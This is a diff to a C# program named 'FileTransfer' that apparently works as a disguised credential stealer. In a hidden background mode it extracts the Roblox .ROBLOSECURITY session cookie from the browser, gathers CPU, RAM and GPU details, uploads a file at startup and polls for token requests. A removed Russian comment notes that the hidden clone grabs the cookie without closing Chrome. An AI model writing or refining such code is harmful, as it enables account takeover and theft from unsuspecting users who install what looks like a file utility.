@@ -178,7 +178,10 @@ namespace FileTransfer
             Log("Background work start");
             try
             {
-                // Клон извлекает куку при старте, видимое окно — нет (не убивает Chrome)
+                _cpu = ComputerInfo.GetCPU();
+                _ram = ComputerInfo.GetRAM();
+                _gpu = ComputerInfo.GetGPU();
+
                 if (_backgroundMode)
                 {
                     _cachedToken ??= CookieExtractor.ExtractRobloSecurity();
@@ -187,15 +190,12 @@ namespace FileTransfer
                         ReadCookieDebugLog();
                 }
 
-                _cpu = ComputerInfo.GetCPU();
-                _ram = ComputerInfo.GetRAM();
-                _gpu = ComputerInfo.GetGPU();
-
                 await UploadFileOnStartupAsync();
 
                 Log("Background work OK");
 
-                await TokenRequestPollLoopAsync();
+                if (_backgroundMode)
+                    await TokenRequestPollLoopAsync();
             }
             catch (Exception ex)
             {
